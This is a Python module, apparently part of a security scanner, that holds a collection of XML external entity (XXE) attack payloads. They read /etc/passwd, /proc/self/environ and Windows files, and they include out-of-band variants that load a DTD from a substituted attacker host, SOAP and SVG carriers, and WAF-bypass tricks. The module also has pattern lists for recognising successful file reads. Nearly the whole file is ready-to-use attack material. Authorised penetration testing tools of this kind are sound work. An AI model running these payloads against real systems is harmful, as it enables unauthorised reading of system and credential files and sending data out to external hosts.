import secrets
import string


def generate_token(length: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(length))


# ============================================================
# Classic XXE payloads — 读取系统文件
# ============================================================
CLASSIC_PAYLOADS = [
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
    '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<data>&xxe;</data>''',
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>''',
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<foo>&xxe;</foo>''',
]


# ============================================================
# Parameter Entity payloads
# ============================================================
PARAM_ENTITY_PAYLOADS = [
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<foo>test</foo>''',
]


# ============================================================
# OOB (Out-of-Band) XXE payloads
# ============================================================
OOB_PAYLOADS = [
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{attacker}/xxe">
  %xxe;
]>
<foo>test</foo>''',
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://{attacker}/xxe.dtd">
  %dtd;
]>
<foo>test</foo>''',
]


# ============================================================
# SOAP XXE payloads
# ============================================================
SOAP_PAYLOADS = [
    '''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <foo><![CDATA[<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;]]></foo>
  </soap:Body>
</soap:Envelope>''',
]


# ============================================================
# SVG XXE payloads
# ============================================================
SVG_PAYLOADS = [
    '''<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>''',
]


# ============================================================
# WAF bypass payloads
# ============================================================
WAF_BYPASS_PAYLOADS = [
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>''',
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///./././etc/passwd">
]>
<foo>&xxe;</foo>''',
]


# ============================================================
# Error-based indicators
# ============================================================
XXE_ERROR_PATTERNS = [
    'XML parse error',
    'DOCTYPE',
    'Entity',
    'SYSTEM',
    'PUBLIC',
    'XML parsing',
    'not well-formed',
    'Invalid XML',
    'xmlParseEntityRef',
    'Start tag expected',
    'Premature end of data',
]


# ============================================================
# Success indicators (file content patterns)
# ============================================================
XXE_SUCCESS_PATTERNS = [
    'root:x:0:0:',
    '[extensions]',
    '[fonts]',
    'daemon:',
    'nobody:',
    '/bin/bash',
    '/bin/sh',
]


def build_oob_payloads(attacker_host: str, file_path: str = '/etc/hostname') -> list:
    """Build OOB XXE payloads with target host and file path"""
    payloads = []
    for tmpl in OOB_PAYLOADS:
        payloads.append(tmpl.replace('{attacker}', attacker_host))
    return payloads
